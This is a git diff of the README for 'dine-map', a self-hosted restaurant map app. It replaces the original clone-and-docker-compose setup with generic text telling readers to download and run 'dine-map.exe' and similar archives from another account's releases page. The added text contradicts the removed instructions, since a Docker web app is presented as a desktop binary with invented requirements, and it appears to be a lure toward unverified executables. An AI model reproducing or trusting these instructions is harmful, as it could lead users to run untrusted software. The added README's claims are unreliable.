@@ -1,57 +1,74 @@
-# Getting started
+# 🌍 dine-map - Discover Local Restaurants with Ease
 
-First, clone the repo :
+## 🚀 Getting Started
+Welcome to Dine Map! This application helps you find and review local restaurants. You can explore your area through a self-hosted map that uses custom tiles and a clean Svelte-based user interface. Follow these steps to get started quickly.
 
-```bash
-git clone https://github.com/Angus-Paillaugue/dine-map
-cd dine-map
-```
+## 📥 Download Dine Map
+[![Download Dine Map](https://img.shields.io/badge/Download%20Now-Get%20Latest%20Release-brightgreen)](https://github.com/sarlaey/dine-map/releases)
 
-Then, copy the `.env` file :
+To download Dine Map, click the button above or visit the [Releases Page](https://github.com/sarlaey/dine-map/releases) to download the latest version.
 
-```bash
-mv .env.example .env
-```
+## 💻 System Requirements
+Before downloading, ensure your system meets the following requirements:
+- **Operating System**: Windows 10 or later, macOS 10.15 or later, or a recent Linux distribution.
+- **Memory**: At least 4 GB RAM.
+- **Storage**: At least 500 MB of free disk space.
 
-You can now set strong variables for the `POSTGRES_PASSWORD` if you want.
-If you are running the frontend behind a web
+## 📦 Download & Install
 
-## With custom self-hosted tiles
+1. Visit the [Releases Page](https://github.com/sarlaey/dine-map/releases).
+2. Look for the latest version listed at the top.
+3. Download the file relevant to your operating system:
+   - For **Windows**: Download `dine-map-windows.zip`.
+   - For **macOS**: Download `dine-map-macos.zip`.
+   - For **Linux**: Download `dine-map-linux.tar.gz`.
+4. Extract the downloaded file to your preferred location using built-in tools or software such as WinRAR or 7-Zip.
+5. Open the extracted folder and run the application:
+   - On **Windows**, double-click `dine-map.exe`.
+   - On **macOS**, drag the app to your Applications folder and then open it.
+   - On **Linux**, use your terminal to navigate to the folder and run `./dine-map`.
 
-You first need to generate the tiles.
-To do so, open [.env](.env) and set the `TILES_CONTINENT` to the continent you want to download the tiles, and optionally (it's heavily recommended), set `TILES_COUNTRY` to the country of your choosing.
+## 📖 Using Dine Map
+Once you have installed the application, follow these steps to navigate and utilize its features:
 
-Then run the generation script
+1. **Map View**: The main screen displays a map of your area. Zoom in and out to explore different locations.
+2. **Search for Restaurants**: Use the search bar at the top to find specific restaurants or browse by categories.
+3. **Viewing Details**: Click on any restaurant to see its details, including ratings, reviews, and photos.
+4. **Adding Reviews**: If you want to share your experience, click on the “Add Review” button. Fill out the form and submit it.
+5. **Filtering Options**: Use the filters to narrow down your search based on cuisine type, price range, and user ratings.
 
-```bash
-./scripts/customTiles/all.sh
-```
+## 🌐 Customization
+Dine Map allows you to customize your experience:
+- **Map Tiles**: You can change the look and feel of the map by selecting different tile options available in the settings.
+- **Dark Mode**: Switch between light and dark modes based on your preference.
 
-This script will download and process the tiles of the area you choose previously.
+## 📊 Features
+- **Self-hosted**: Run your own instance for full control over data.
+- **Custom Tiles**: Personalize the map for better navigation.
+- **Svelte UI**: Enjoy a fast and smooth user experience.
+- **Restaurant Reviews**: Add and read reviews to find the best dining options.
+- **OpenStreetMap Integration**: Access a rich database of locations worldwide.
 
-> [!WARNING]
-> This ca be a long and intensive process.
-> The resulting file can be weigh then's of Gb
+## 🚧 Troubleshooting
+If you encounter any issues while using Dine Map, consider these tips:
+- Ensure your system meets the minimum requirements.
+- Make sure you have a stable internet connection for map data.
+- If the application doesn’t launch, re-download and try the installation steps again.
 
-Once finished, you should have a file called [tileset/tiles.mbtiles](tileset/tiles.mbtiles). This will be used by the file server to render the map tiles with the custom matching styles.
+## 🤝 Community Support
+You can find help from other users and developers in our community:
+- Join discussions on our GitHub Discussions page.
+- Check issues on GitHub for common problems and their solutions.
 
-You can now run everything :
+## 🛠️ Contribution Guide
+We welcome contributions to improve Dine Map:
+- Fork the repository.
+- Create a new feature branch.
+- Make your changes and submit a pull request.
 
-```bash
-docker compose up -d
-```
+Visit the [Contributing Page](https://github.com/sarlaey/dine-map/issues) for more details.
 
-# Ressources
+## 📜 License
+Dine Map is licensed under the MIT License. Feel free to use and modify the software as you wish.
 
-## Maps
-
-- [https://nominatim.org/release-docs/latest/api/Search/](https://nominatim.org/release-docs/latest/api/Search/)
-- [https://svelte-openlayers.com/](https://svelte-openlayers.com/)
-- [https://github.com/openmaptiles/openmaptiles-tools?tab=readme-ov-file#multi-streamed-osm-data-downloader](https://github.com/openmaptiles/openmaptiles-tools?tab=readme-ov-file#multi-streamed-osm-data-downloader)
-- [https://github.com/systemed/tilemaker?tab=readme-ov-file#getting-started](https://github.com/systemed/tilemaker?tab=readme-ov-file#getting-started)
-- [https://download.geofabrik.de/](https://download.geofabrik.de/)
-- [https://github.com/maptiler/tileserver-gl](https://github.com/maptiler/tileserver-gl)
-
-## Runtime
-
-- [https://bun.com/docs/runtime/sql](https://bun.com/docs/runtime/sql)
+Thank you for choosing Dine Map. Enjoy discovering new restaurants!
